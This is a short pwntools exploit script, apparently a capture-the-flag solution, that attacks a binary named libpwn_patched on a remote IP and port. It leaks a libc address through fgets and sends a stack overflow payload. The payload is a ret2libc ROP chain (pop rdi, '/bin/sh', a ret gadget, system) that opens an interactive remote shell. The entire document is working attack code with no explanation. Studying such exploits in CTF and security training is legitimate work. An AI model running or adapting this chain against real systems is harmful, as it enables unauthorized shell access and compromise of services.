#!/usr/bin/env python3

from pwn import *

exe = ELF("./libpwn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
#p = process()
p = remote('61.14.233.78',8332)

pop_rdi = 0x000000000010f75b
p.recvuntil(b'This program is just a print function. Bye!')
p.recvlines(2)
libc.address = int(p.recvline()[:-1],16) - libc.sym.fgets
print(hex(libc.address))

payload = b'a'*0x30
payload += p64(0)
payload += p64(libc.address+pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(pop_rdi+1+libc.address)
payload += p64(libc.sym.system)
input()
p.sendline(payload)

p.interactive()
